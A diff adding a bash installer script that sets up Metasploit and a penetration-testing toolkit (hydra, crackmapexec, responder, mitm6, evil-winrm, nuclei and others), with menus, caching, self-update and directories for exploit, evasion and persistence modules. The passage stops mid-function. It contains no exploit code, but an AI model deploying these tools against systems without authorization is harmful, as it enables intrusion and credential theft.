@@ -1,0 +1,4088 @@
+#!/usr/bin/env bash
+# ==============================================================================
+#  METASPLOIT-INSTALLER MASTER ORCHESTRATOR — setup.sh v3.0 Enterprise-Pro
+#  Single-script full-stack deployment: 30+ modules, 18 premium features
+# ==============================================================================
+set -euo pipefail; IFS=$'\n\t'
+
+# ── Colors ──────────────────────────────────────────────────────────────────────
+RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'
+MAGENTA='\033[0;35m'; CYAN='\033[0;36m'; BOLD='\033[1m'; DIM='\033[2m'; NC='\033[0m'
+
+# ── Global State ────────────────────────────────────────────────────────────────
+SCRIPT_START_TIME=$(date +%s)
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+SCRIPT_NAME="$(basename "${BASH_SOURCE[0]}")"
+_BG_PIDS=(); _SPINNER_PID=""; DRY_RUN=false; FORCE_MODE=false
+SELF_UPDATED=false; _INSTALL_PHASE="init"
+
+# ── Logging ─────────────────────────────────────────────────────────────────────
+log()   { echo -e "  ${GREEN}[✓]${NC} $(date +%H:%M:%S) $*"; }
+info()  { echo -e "  ${BLUE}[*]${NC} $*"; }
+warn()  { echo -e "  ${YELLOW}[!]${NC} $*" >&2; }
+err()   { echo -e "  ${RED}[✗]${NC} $*" >&2; }
+step()  { echo -e "\n${CYAN}${BOLD}═══ $* ═══${NC}\n"; }
+title() { echo -e "${MAGENTA}${BOLD}$*${NC}"; }
+banner_box() {
+    echo -e "\n${RED}${BOLD}╔══════════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${RED}${BOLD}║  METASPLOIT INSTALLER — Enterprise Master Orchestrator v3.0 ║${NC}"
+    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════════╝${NC}\n"
+}
+
+# ── Trap ────────────────────────────────────────────────────────────────────────
+on_exit() {
+    local ec=$?
+    for p in "${_BG_PIDS[@]:-}"; do kill "$p" 2>/dev/null || true; done
+    [[ -n "${_SPINNER_PID:-}" ]] && kill "$_SPINNER_PID" 2>/dev/null || true
+    if [[ $ec -ne 0 && $ec -ne 130 ]]; then
+        err "Exit code $ec at line ${BASH_LINENO[0]:-?}: ${BASH_COMMAND:-unknown}"
+    fi
+}
+trap on_exit EXIT; trap 'echo -e "\n${YELLOW}[!] SIGINT${NC}"; exit 130' INT
+trap 'echo -e "\n${YELLOW}[!] SIGTERM${NC}"; exit 143' TERM
+
+# ── Helpers ─────────────────────────────────────────────────────────────────────
+cmd_exists() { command -v "$1" &>/dev/null; }
+is_root() { [[ "${EUID:-$(id -u)}" -eq 0 ]]; }
+has_sudo() { cmd_exists sudo && sudo -n true 2>/dev/null; }
+user_mode() { is_root && echo "root" || { has_sudo && echo "sudo" || echo "normal"; }; }
+priv_run() {
+    local cmd="$1"
+    case "$(user_mode)" in root) eval "$cmd" ;; sudo) eval "sudo $cmd" ;;
+        normal) eval "$cmd" 2>/dev/null || { warn "Need sudo for: $cmd"; return 1; } ;; esac
+}
+ask_yesno() {
+    local prompt="${1:-Continue?}" d="${2:-y}"; $FORCE_MODE && return 0
+    local h; [[ "$d" == "y" ]] && h="[Y/n]" || h="[y/N]"
+    local a; read -r -p "  [?] $prompt $h: " a; a="${a:-$d}"
+    [[ "${a,,}" == "y" || "${a,,}" == "yes" ]]
+}
+
+# ── Spinner ─────────────────────────────────────────────────────────────────────
+spinner() { local pid=$1 m="${2:-Working}"; local s="⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
+    while kill -0 "$pid" 2>/dev/null; do for ((i=0;i<${#s};i++)); do
+        printf "\r  ${BLUE}%s${NC} %s" "${s:$i:1}" "$m"; sleep 0.1; done; done
+    printf "\r  ${GREEN}✓${NC} %s Done\n" "$m"; }
+
+# ── Progress file helpers ───────────────────────────────────────────────────────
+mark_done() { echo "[DONE] $(date +%H:%M:%S) $1" >> "${PROGRESS_FILE:-/dev/null}" 2>/dev/null || true; }
+is_done() { [[ -f "${PROGRESS_FILE:-}" ]] && grep -qF "[DONE] $1" "$PROGRESS_FILE" 2>/dev/null; }
+
+# ── Timer ───────────────────────────────────────────────────────────────────────
+elapsed() { echo "$(($(date +%s) - SCRIPT_START_TIME))s"; }
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  CONFIG SYSTEM (.env)                                                       ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+
+DEFAULT_INSTALL_DIR="$HOME/metasploit-installer"
+CONFIG_FILE=""
+GITHUB_REPO_URL=""
+SKIP_TOOLS=""
+APT_MIRROR=""
+AUTO_PUSH=false
+DEBUG_MODE=false
+
+load_config() {
+    CONFIG_FILE="${INSTALL_DIR:-$DEFAULT_INSTALL_DIR}/config.env"
+    if [[ -f "$CONFIG_FILE" ]]; then
+        # shellcheck disable=SC1090
+        set +x; source "$CONFIG_FILE" 2>/dev/null || warn "Config parse partial"; set -x 2>/dev/null || true
+        INSTALL_DIR="${INSTALL_DIR:-$DEFAULT_INSTALL_DIR}"
+        GITHUB_REPO_URL="${GITHUB_REPO_URL:-}"
+        SKIP_TOOLS="${SKIP_TOOLS:-}"
+        APT_MIRROR="${APT_MIRROR:-}"
+        AUTO_PUSH="${AUTO_PUSH:-false}"
+        DEBUG_MODE="${DEBUG_MODE:-false}"
+        info "Config loaded: $CONFIG_FILE"
+    else
+        info "No config.env found — will create defaults"
+    fi
+    export INSTALL_DIR GITHUB_REPO_URL SKIP_TOOLS APT_MIRROR AUTO_PUSH DEBUG_MODE
+}
+
+create_default_config() {
+    local cfg="$INSTALL_DIR/config.env"
+    $DRY_RUN && { info "DRY-RUN: would write $cfg"; return 0; }
+    mkdir -p "$INSTALL_DIR" 2>/dev/null || true
+    cat > "$cfg" << CFGEOF
+# ==============================================================================
+# metasploit-installer CONFIGURATION
+# ==============================================================================
+# Edit these variables BEFORE running setup.sh --full
+# Lines starting with # are comments
+
+# Installation directory (where the project is built)
+INSTALL_DIR="${INSTALL_DIR:-$HOME/metasploit-installer}"
+
+# GitHub repo URL (leave empty to skip push, or set for auto-push)
+GITHUB_REPO_URL=""
+
+# Skip specific tool groups (comma-separated: go,python,ruby,nmap)
+SKIP_TOOLS=""
+
+# APT package mirror (empty = default, or e.g. http://id.archive.ubuntu.com/ubuntu)
+APT_MIRROR=""
+
+# Auto-push to GitHub after setup (true/false)
+AUTO_PUSH=false
+
+# Debug mode (true = verbose output)
+DEBUG_MODE=false
+
+# Checksums (optional — populate for binary verification)
+CHECKSUM_NMAP=""
+CHECKSUM_METASPLOIT=""
+CFGEOF
+    chmod 600 "$cfg"
+    log "Created: $cfg (chmod 600)"
+}
+
+encrypt_config() {
+    local cfg="$INSTALL_DIR/config.env"
+    [[ ! -f "$cfg" ]] && { err "No config.env to encrypt"; return 1; }
+    if ! cmd_exists openssl; then
+        warn "openssl not found — installing..."
+        priv_run "apt-get install -y openssl" 2>/dev/null || { err "Cannot install openssl"; return 1; }
+    fi
+    read -r -s -p "  [?] Encryption password: " ENC_PASS
+    echo ""
+    read -r -s -p "  [?] Confirm password: " ENC_CONF
+    echo ""
+    [[ "$ENC_PASS" != "$ENC_CONF" ]] && { err "Passwords do not match"; return 1; }
+    openssl aes-256-cbc -salt -pbkdf2 -in "$cfg" -out "${cfg}.enc" -pass pass:"$ENC_PASS" 2>/dev/null || {
+        err "Encryption failed"; return 1
+    }
+    shred -u "$cfg" 2>/dev/null || rm -f "$cfg"
+    log "Config encrypted → ${cfg}.enc (original shredded)"
+    warn "Save your password securely — it cannot be recovered"
+}
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  ENVIRONMENT DETECTION (OS / ARCH / DISTRO / PROXY)                         ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+
+detect_environment() {
+    export ARCH="$(uname -m)"
+    export OS_TYPE; case "$(uname -s)" in Linux) OS_TYPE="linux" ;; Darwin) OS_TYPE="macos" ;; *) OS_TYPE="other" ;; esac
+
+    # Distro
+    export DISTRO_ID DISTRO_VERSION DISTRO_FAMILY PACKAGE_MANAGER PKG_INSTALL
+    if [[ -f /etc/os-release ]]; then source /etc/os-release 2>/dev/null || true; DISTRO_ID="${ID,,}"; DISTRO_VERSION="${VERSION_ID:-}"
+    elif [[ -f /etc/arch-release ]]; then DISTRO_ID="arch"
+    elif cmd_exists termux-info 2>/dev/null; then DISTRO_ID="termux"
+    else DISTRO_ID="unknown"; fi
+
+    case "$DISTRO_ID" in
+        ubuntu|debian|kali|parrot|linuxmint|pop|raspbian|zorin) DISTRO_FAMILY="debian"; PACKAGE_MANAGER="apt"; PKG_INSTALL="sudo apt-get install -y --no-install-recommends"; PKG_UPDATE="sudo apt-get update -qq" ;;
+        fedora|rhel|centos|rocky|alma|oracle) DISTRO_FAMILY="redhat"; PACKAGE_MANAGER="dnf"; PKG_INSTALL="sudo dnf install -y"; PKG_UPDATE="" ;;
+        arch|manjaro|endeavouros|garuda) DISTRO_FAMILY="arch"; PACKAGE_MANAGER="pacman"; PKG_INSTALL="sudo pacman -Sy --noconfirm --needed"; PKG_UPDATE="sudo pacman -Sy --noconfirm" ;;
+        opensuse*|sles) DISTRO_FAMILY="suse"; PACKAGE_MANAGER="zypper"; PKG_INSTALL="sudo zypper install -y"; PKG_UPDATE="" ;;
+        termux) DISTRO_FAMILY="termux"; PACKAGE_MANAGER="pkg"; PKG_INSTALL="pkg install -y"; PKG_UPDATE="pkg update -qq" ;;
+        *) DISTRO_FAMILY="unknown"; PACKAGE_MANAGER=""; PKG_INSTALL=""; PKG_UPDATE="" ;;
+    esac
+
+    # Architecture bin mapping
+    case "$ARCH" in
+        x86_64|amd64) export BIN_ARCH="amd64"; export GO_ARCH="amd64" ;;
+        aarch64|arm64) export BIN_ARCH="arm64"; export GO_ARCH="arm64" ;;
+        armv7l|arm) export BIN_ARCH="arm"; export GO_ARCH="armv6l" ;;
+        *) export BIN_ARCH="$ARCH"; export GO_ARCH="$ARCH"; warn "Unknown arch: $ARCH — using as-is" ;;
+    esac
+
+    # User
+    export CURRENT_USER="$(whoami)"; export HOME_DIR="$HOME"; export USER_MODE="$(user_mode)"
+
+    # Proxy detection
+    export HTTP_PROXY="${http_proxy:-${HTTP_PROXY:-}}"; export HTTPS_PROXY="${https_proxy:-${HTTPS_PROXY:-}}"
+    [[ -n "$HTTP_PROXY" ]] && { info "HTTP proxy detected: $HTTP_PROXY"; git config --global http.proxy "$HTTP_PROXY" 2>/dev/null || true; }
+    [[ -n "$HTTPS_PROXY" ]] && { info "HTTPS proxy detected: $HTTPS_PROXY"; git config --global https.proxy "$HTTPS_PROXY" 2>/dev/null || true; }
+
+    # APT mirror override
+    if [[ -n "${APT_MIRROR:-}" ]] && [[ "$DISTRO_FAMILY" == "debian" ]]; then
+        info "APT mirror override: $APT_MIRROR"
+        $DRY_RUN || priv_run "sed -i 's|http://archive.ubuntu.com/ubuntu|${APT_MIRROR}|g' /etc/apt/sources.list 2>/dev/null || true"
+    fi
+
+    info "Env: $OS_TYPE/$DISTRO_ID/$DISTRO_FAMILY arch=$ARCH user=$CURRENT_USER mode=$USER_MODE"
+}
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  CACHE SYSTEM (~/.cache/metasploit-installer/)                              ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+
+CACHE_DIR="${HOME}/.cache/metasploit-installer"
+
+init_cache() { mkdir -p "$CACHE_DIR" 2>/dev/null || true; }
+
+cache_get() {
+    local file="$1" hash="${2:-}"
+    local cpath="$CACHE_DIR/$file"
+    [[ -f "$cpath" ]] || return 1
+    if [[ -n "$hash" ]]; then
+        local actual; actual=$(sha256sum "$cpath" 2>/dev/null | awk '{print $1}')
+        [[ "$actual" == "$hash" ]] || { warn "Cached $file hash mismatch — re-download"; return 1; }
+    fi
+    cp "$cpath" . 2>/dev/null || ln "$cpath" . 2>/dev/null || return 1
+    log "Using cached: $file"
+    return 0
+}
+
+cache_store() { local f="$1"; cp "$f" "$CACHE_DIR/" 2>/dev/null || true; info "Cached: $f"; }
+
+clear_cache() {
+    step "Clearing Cache"
+    if [[ -d "$CACHE_DIR" ]]; then
+        rm -rf "$CACHE_DIR" && log "Cache cleared: $CACHE_DIR" || err "Failed to clear cache"
+    else info "No cache to clear"; fi
+}
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  SELF-UPDATE (git fetch → compare → pull → exec)                            ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+
+self_update() {
+    [[ "$SELF_UPDATED" == "true" ]] && return 0
+    if [[ -d "$SCRIPT_DIR/.git" ]]; then
+        info "Checking for updates..."
+        cd "$SCRIPT_DIR"
+        git fetch origin main 2>/dev/null || { warn "Cannot fetch — no remote or no network"; return 0; }
+        local local_hash; local_hash=$(git rev-parse HEAD 2>/dev/null || echo "")
+        local remote_hash; remote_hash=$(git rev-parse origin/main 2>/dev/null || echo "")
+        if [[ "$local_hash" != "$remote_hash" && -n "$remote_hash" ]]; then
+            info "Update available — pulling..."
+            git pull origin main 2>/dev/null || { warn "Pull failed"; return 0; }
+            log "Updated to $remote_hash — restarting..."
+            exec bash "$0" --updated "${@}"
+            exit 0
+        else
+            log "Already up-to-date"
+        fi
+        cd - >/dev/null
+    fi
+}
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  CHECKPOINT & RESUME                                                        ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+
+init_checkpoint() {
+    PROGRESS_FILE="$INSTALL_DIR/.progress"
+    $DRY_RUN && { info "DRY-RUN: progress file virtual"; return 0; }
+    if [[ -f "$PROGRESS_FILE" ]]; then
+        if is_done "full_install"; then
+            warn "Full install already completed per progress file"
+            ask_yesno "Re-run anyway?" "n" || { info "Use --force to override"; exit 0; }
+            rm -f "$PROGRESS_FILE"
+        elif $DO_RESUME; then
+            log "Resume mode: will skip completed phases"
+        else
+            warn "Partial progress detected — use --resume to continue"
+            info "Completed phases:"
+            grep '^\[DONE\]' "$PROGRESS_FILE" 2>/dev/null | while read -r line; do
+                echo "    $line"
+            done
+            ask_yesno "Start fresh?" "y" || {
+                info "Re-run with --resume"; exit 0
+            }
+            rm -f "$PROGRESS_FILE"
+        fi
+    fi
+    echo "# metasploit-installer progress — $(date -Iseconds)" > "$PROGRESS_FILE"
+}
+
+resume_skip() {
+    local phase="$1"
+    if [[ -f "${PROGRESS_FILE:-}" ]] && grep -qF "[DONE] $phase" "$PROGRESS_FILE" 2>/dev/null; then
+        log "Skipping completed phase: $phase"
+        return 0
+    fi
+    return 1
+}
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  SYSTEM SNAPSHOT (PRE/POST DIFF) — FEATURE 17                               ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+
+SNAP_PRE="/tmp/msf-installer-snap-pre-$$.txt"
+SNAP_POST="/tmp/msf-installer-snap-post-$$.txt"
+
+take_snapshot() {
+    local out="$1"
+    echo "=== SNAPSHOT $(date -Iseconds) ===" > "$out"
+    echo "--- dpkg -l ---" >> "$out"
+    dpkg -l 2>/dev/null >> "$out" || rpm -qa 2>/dev/null >> "$out" || true
+    echo "--- /usr/local/bin ---" >> "$out"
+    ls -la /usr/local/bin/ 2>/dev/null >> "$out" || true
+    echo "--- processes ---" >> "$out"
+    ps aux --no-headers 2>/dev/null | head -50 >> "$out" || true
+    echo "--- PATH ---" >> "$out"
+    echo "$PATH" >> "$out"
+}
+
+diff_snapshots() {
+    local diff_out="$INSTALL_DIR/audit_diff.log"
+    step "System Audit Diff"
+    mkdir -p "$(dirname "$diff_out")" 2>/dev/null || true
+    if diff "$SNAP_PRE" "$SNAP_POST" > "$diff_out" 2>/dev/null; then
+        log "No system changes detected (clean install?)"
+    else
+        warn "Changes detected — saved to audit_diff.log"
+        info "Summary: $(grep -c '^>' "$diff_out" 2>/dev/null || echo 0) lines added, $(grep -c '^<' "$diff_out" 2>/dev/null || echo 0) removed"
+        echo "See: $diff_out"
+    fi
+}
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  WHIPTAIL TUI MENUS (with text fallback)                                    ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+
+HAS_WHIPTAIL=false; cmd_exists whiptail && HAS_WHIPTAIL=true
+
+whiptail_menu() {
+    local title="$1" text="$2" height="$3" width="$4" menu_height="$5"
+    shift 5
+    if $HAS_WHIPTAIL && [[ -n "${TERM:-}" && "$TERM" != "dumb" ]]; then
+        whiptail --title "$title" --menu "$text" "$height" "$width" "$menu_height" "$@" 2>&1
+    else
+        echo ""
+        echo -e "${CYAN}${BOLD}$title${NC}"
+        echo "$text"
+        echo ""
+        local i=1; local tags=("$@")
+        for ((i=0; i<${#tags[@]}; i+=3)); do
+            echo -e "  ${GREEN}${tags[$i]}${NC}) ${tags[$i+1]}"
+        done
+        echo ""
+        read -r -p "  [?] Choice: " choice; echo "$choice"
+    fi
+}
+
+whiptail_gauge() {
+    local title="$1" text="$2" pct="$3"
+    if $HAS_WHIPTAIL && [[ -n "${TERM:-}" && "$TERM" != "dumb" ]]; then
+        whiptail --title "$title" --gauge "$text" 8 70 "$pct" 2>/dev/null
+    else
+        info "$text ($pct%)"
+    fi
+}
+
+show_tui_main_menu() {
+    local choice
+    choice=$(whiptail_menu \
+        "Metasploit Installer — Main Menu" \
+        "Select an action:" \
+        22 76 14 \
+        "full"      "🚀 Full Installation (all components)" \
+        "check"     "🔍 Pre-flight System Check" \
+        "deps"      "📦 Install Dependencies Only" \
+        "modules"   "📁 Browse & Run Modules" \
+        "install"   "⚙️  Install Metasploit Framework" \
+        "cheatsheet" "📖 View Cheatsheets" \
+        "runbooks"  "📋 View Attack Runbooks" \
+        "framework" "🧠 Pentest Framework (5 Phases)" \
+        "tmux"      "🖥️  Create Tmux Pentest Session" \
+        "health"    "🏥 Health Check & Auto-Repair" \
+        "report"    "📊 Generate System Report" \
+        "encrypt"   "🔐 Encrypt config.env" \
+        "uninstall" "🗑️  Uninstall Everything" \
+        "quit"      "👋 Exit")
+    case "$choice" in
+        full)      do_full_install ;;
+        check)     do_preflight_check ;;
+        deps)      do_install_deps ;;
+        modules)   do_browse_modules ;;
+        install)   do_install_metasploit ;;
+        cheatsheet) do_show_cheatsheets ;;
+        runbooks)  do_show_runbooks ;;
+        framework) do_show_framework ;;
+        tmux)      create_tmux_session ;;
+        health)    do_health_check ;;
+        report)    generate_report ;;
+        encrypt)   encrypt_config ;;
+        uninstall) do_uninstall ;;
+        quit|"")   info "Goodbye!"; exit 0 ;;
+        *) warn "Invalid choice"; show_tui_main_menu ;;
+    esac
+}
+
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  FEATURE 7: CHECKSUM VERIFICATION                                           ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+
+verify_checksum() {
+    local file="$1" expected_hash="${2:-}" label="${3:-binary}"
+    [[ -z "$expected_hash" ]] && { warn "No checksum defined for $label — skipping verification"; return 0; }
+    [[ ! -f "$file" ]] && { err "$file not found for checksum"; return 5; }
+    local actual; actual=$(sha256sum "$file" 2>/dev/null | awk '{print $1}')
+    if [[ "$actual" != "$expected_hash" ]]; then
+        err "CHECKSUM MISMATCH for $label!"
+        err "  Expected: $expected_hash"
+        err "  Got:      $actual"
+        err "  File:     $file"
+        return 5
+    fi
+    log "Checksum verified: $label"
+    return 0
+}
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  FEATURE 8: PARALLEL INSTALLATION ENGINE                                    ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+
+parallel_run() {
+    local -a pids=()
+    local -a labels=()
+    local total=0 completed=0
+    echo ""
+    info "Launching parallel jobs..."
+    for job in "$@"; do
+        IFS='|' read -r label cmd <<< "$job"
+        labels+=("$label"); total=$((total + 1))
+        info "  Starting: $label"
+        (eval "$cmd" &>/tmp/msf-parallel-$$-${total}.log && echo "OK" > "/tmp/msf-parallel-$$-${total}.status" || echo "FAIL" > "/tmp/msf-parallel-$$-${total}.status") &
+        pids+=($!)
+    done
+
+    info "Waiting for $total jobs..."
+    for idx in "${!pids[@]}"; do
+        local pid="${pids[$idx]}"; local label="${labels[$idx]}"
+        while kill -0 "$pid" 2>/dev/null; do sleep 2; done
+        wait "$pid" 2>/dev/null; local ec=$?
+        completed=$((completed + 1))
+        local pct=$(( completed * 100 / total ))
+        whiptail_gauge "Parallel Install" "Completed: $label ($completed/$total)" "$pct"
+        if [[ $ec -eq 0 ]] && grep -q "OK" "/tmp/msf-parallel-$$-$((idx+1)).status" 2>/dev/null; then
+            log "$label done ($completed/$total)"
+        else
+            warn "$label FAILED ($completed/$total) — check /tmp/msf-parallel-$$-$((idx+1)).log"
+        fi
+    done
+    rm -f /tmp/msf-parallel-$$-*.{log,status} 2>/dev/null || true
+    log "All parallel jobs completed"
+}
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  DEPENDENCY INSTALLER                                                       ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+
+install_system_deps() {
+    resume_skip "system_deps" && return 0
+    step "System Package Installation"
+    if [[ "$DISTRO_FAMILY" != "debian" && "$DISTRO_FAMILY" != "redhat" && "$DISTRO_FAMILY" != "arch" && "$DISTRO_FAMILY" != "termux" ]]; then
+        err "Unsupported distro: $DISTRO_ID ($DISTRO_FAMILY)"
+        info "Supported: Debian/Ubuntu/Kali, Fedora/RHEL, Arch, Termux"
+        ask_yesno "Try anyway?" "n" || exit 1
+    fi
+
+    $DRY_RUN && { info "DRY-RUN: would install system packages"; return 0; }
+
+    [[ -n "${PKG_UPDATE:-}" ]] && { info "Updating repos..."; $PKG_UPDATE 2>/dev/null || warn "Repo update failed"; }
+
+    local PKGS="build-essential autoconf bison make git curl wget libssl-dev libpcap-dev libpq-dev libsqlite3-dev zlib1g-dev libreadline-dev libffi-dev libgmp-dev libxml2-dev libxslt1-dev gpgv2 apt-transport-https software-properties-common ruby ruby-dev postgresql postgresql-contrib nmap enum4linux sqlmap hydra crackmapexec impacket-scripts bloodhound tmux tree jq python3 python3-pip pipx golang-go nikto dirb wpscan arp-scan"
+
+    # Adjust per distro
+    case "$DISTRO_FAMILY" in
+        redhat) PKGS="gcc gcc-c++ make autoconf bison git curl wget openssl-devel libpcap-devel libpq-devel sqlite-devel zlib-devel readline-devel libffi-devel gmp-devel libxml2-devel libxslt-devel ruby ruby-devel postgresql postgresql-server postgresql-devel nmap sqlmap hydra crackmapexec bloodhound tmux tree jq python3 python3-pip pipx golang nikto dirb wpscan arp-scan" ;;
+        arch) PKGS="base-devel autoconf bison make git curl wget openssl libpcap postgresql-libs sqlite zlib readline libffi gmp libxml2 libxslt ruby postgresql nmap sqlmap hydra crackmapexec bloodhound tmux tree jq python python-pip python-pipx go nikto dirb wpscan arp-scan" ;;
+        termux) PKGS="clang make binutils autoconf bison git curl wget openssl libpcap postgresql sqlite zlib readline libffi gmp libxml2 libxslt ruby postgresql nmap python python-pip hydra tmux tree jq golang" ;;
+    esac
+
+    info "Installing: $PKGS"
+    if $PKG_INSTALL $PKGS 2>&1 | tail -30; then
+        log "All system packages installed"
+    else
+        warn "Batch failed — installing individually..."
+        for pkg in $PKGS; do
+            info "  Trying: $pkg"
+            $PKG_INSTALL "$pkg" 2>/dev/null && log "  $pkg ✓" || warn "  $pkg ✗ (skipped)"
+        done
+    fi
+    mark_done "system_deps"
+}
+
+install_go_tools() {
+    resume_skip "go_tools" && return 0
+    step "Go Security Tools (parallel)"
+    if [[ -n "${SKIP_TOOLS:-}" ]] && echo "$SKIP_TOOLS" | grep -q "go"; then
+        warn "Skipping Go tools (SKIP_TOOLS=go)"
+        return 0
+    fi
+
+    ensure_go() {
+        cmd_exists go || {
+            info "Installing Go..."
+            case "$DISTRO_FAMILY" in
+                debian) priv_run "apt-get install -y golang-go" ;;
+                redhat) priv_run "dnf install -y golang" ;;
+                arch) priv_run "pacman -Sy --noconfirm go" ;;
+                termux) pkg install -y golang ;;
+                *)
+                    local go_url="https://go.dev/dl/go1.22.0.linux-${GO_ARCH}.tar.gz"
+                    info "Downloading Go from $go_url"
+                    curl -fsSL "$go_url" -o /tmp/go.tar.gz
+                    priv_run "rm -rf /usr/local/go && tar -C /usr/local -xzf /tmp/go.tar.gz"
+                    export PATH="$PATH:/usr/local/go/bin"
+                    ;;
+            esac
+        }
+        export PATH="$HOME/go/bin:$PATH"
+        mkdir -p "$HOME/go/bin"
+    }
+    ensure_go
+
+    $DRY_RUN && { info "DRY-RUN: would install go tools"; return 0; }
+
+    local GO_TOOLS=(
+        "subfinder|go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
+        "httpx|go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest"
+        "nuclei|go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
+        "assetfinder|go install -v github.com/tomnomnom/assetfinder@latest"
+        "waybackurls|go install -v github.com/tomnomnom/waybackurls@latest"
+        "gau|go install -v github.com/lc/gau/v2/cmd/gau@latest"
+        "qsreplace|go install -v github.com/tomnomnom/qsreplace@latest"
+        "dalfox|go install -v github.com/hahwul/dalfox/v2@latest"
+        "ParamSpider|go install -v github.com/0xKayala/ParamSpider@latest"
+    )
+
+    parallel_run "${GO_TOOLS[@]}"
+    mark_done "go_tools"
+}
+
+install_python_tools() {
+    resume_skip "python_tools" && return 0
+    step "Python Security Tools (pipx parallel)"
+    if [[ -n "${SKIP_TOOLS:-}" ]] && echo "$SKIP_TOOLS" | grep -q "python"; then
+        warn "Skipping Python tools (SKIP_TOOLS=python)"
+        return 0
+    fi
+    $DRY_RUN && { info "DRY-RUN: would install python tools"; return 0; }
+
+    cmd_exists pipx || {
+        info "Installing pipx..."
+        priv_run "apt-get install -y pipx" 2>/dev/null || python3 -m pip install --user pipx 2>/dev/null || true
+    }
+    pipx ensurepath 2>/dev/null || true
+    export PATH="$HOME/.local/bin:$PATH"
+
+    local PY_TOOLS=(
+        "impacket|pipx install impacket 2>/dev/null || python3 -m pip install --user impacket"
+        "evil-winrm|pipx install evil-winrm 2>/dev/null || gem install evil-winrm 2>/dev/null || true"
+        "mitm6|pipx install mitm6 2>/dev/null || python3 -m pip install --user mitm6"
+        "responder|pipx install responder 2>/dev/null || python3 -m pip install --user responder"
+    )
+
+    parallel_run "${PY_TOOLS[@]}"
+    mark_done "python_tools"
+}
+
+do_install_deps() {
+    install_system_deps
+    install_go_tools
+    install_python_tools
+}
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  DIRECTORY CREATION                                                        ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+
+create_directory_structure() {
+    resume_skip "dirs_created" && return 0
+    step "Creating Directory Structure"
+    local dirs=(
+        "$INSTALL_DIR/cheatsheets"
+        "$INSTALL_DIR/lib"
+        "$INSTALL_DIR/modules/auxiliary/dos"
+        "$INSTALL_DIR/modules/auxiliary/fuzzers"
+        "$INSTALL_DIR/modules/auxiliary/spoof"
+        "$INSTALL_DIR/modules/evasion"
+        "$INSTALL_DIR/modules/cloud"
+        "$INSTALL_DIR/modules/container"
+        "$INSTALL_DIR/modules/exploit/linux"
+        "$INSTALL_DIR/modules/exploit/multi"
+        "$INSTALL_DIR/modules/exploit/windows"
+        "$INSTALL_DIR/modules/gather/dns"
+        "$INSTALL_DIR/modules/gather/email"
+        "$INSTALL_DIR/modules/gather/web"
+        "$INSTALL_DIR/modules/post/linux"
+        "$INSTALL_DIR/modules/post/persistence"
+        "$INSTALL_DIR/modules/post/windows"
+        "$INSTALL_DIR/modules/scanner/http"
+        "$INSTALL_DIR/modules/scanner/network"
+        "$INSTALL_DIR/modules/scanner/smb"
+        "$INSTALL_DIR/modules/scanner/ssh"
+        "$INSTALL_DIR/modules/scanner/ssl"
+        "$INSTALL_DIR/modules/scanner/vuln"
+        "$INSTALL_DIR/runbooks"
+        "$INSTALL_DIR/setup"
+    )
+    $DRY_RUN && { info "DRY-RUN: would create ${#dirs[@]} directories"; return 0; }
+    for d in "${dirs[@]}"; do
+        mkdir -p "$d" && info "  $d" || { err "Failed: mkdir $d"; return 1; }
+    done
+    log "${#dirs[@]} directories created"
+    mark_done "dirs_created"
+}
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  IDEMPOTENCY CHECK                                                         ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+
+check_idempotency() {
+    if [[ -d "$INSTALL_DIR" ]] && [[ "$(ls -A "$INSTALL_DIR" 2>/dev/null | wc -l)" -gt 3 ]]; then
+        warn "Install directory $INSTALL_DIR already has content"
+        if ! $FORCE_MODE; then
+            if ask_yesno "Backup existing & start fresh?" "y"; then
+                local bak="$INSTALL_DIR.bak.$(date +%s)"
+                mv "$INSTALL_DIR" "$bak" && log "Backed up to: $bak"
+            else
+                info "Continuing in-place (may overwrite)"
+            fi
+        fi
+    fi
+}
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  PRE-FLIGHT CHECK (Feature subset from checker.sh logic)                    ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+
+do_preflight_check() {
+    step "Pre-flight System Check"
+    local pass=0 fail=0 warn_c=0
+    check_item() {
+        local label="$1" cmd="$2" fix="${3:-}"
+        if eval "$cmd" 2>/dev/null; then pass=$((pass+1)); log "$label"; else
+            fail=$((fail+1)); err "$label — FIX: $fix"; fi
+    }
+    warn_item() {
+        local label="$1" cmd="$2" note="${3:-}"
+        if eval "$cmd" 2>/dev/null; then pass=$((pass+1)); log "$label"; else
+            warn_c=$((warn_c+1)); warn "$label — $note"; fi
+    }
+    info "── OS ──"
+    check_item "OS supported" '[[ "$DISTRO_FAMILY" =~ ^(debian|redhat|arch|suse|termux)$ ]]' "Unsupported OS"
